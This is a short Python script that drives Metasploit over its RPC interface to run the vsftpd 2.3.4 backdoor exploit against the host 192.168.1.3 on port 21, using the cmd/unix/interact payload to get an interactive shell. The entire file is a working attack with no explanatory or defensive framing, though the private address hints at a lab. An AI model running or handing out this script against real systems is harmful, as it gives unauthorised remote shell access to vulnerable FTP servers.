from metasploit.msfrpc import MsfRpcClient

# Connect to Metasploit
client = MsfRpcClient('password', server='127.0.0.1', port=55552)

# Select exploit
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.1.3'
exploit['RPORT'] = 21

# Select payload
payload = client.modules.use('payload', 'cmd/unix/interact')

# Execute exploit
exploit.execute(payload=payload)
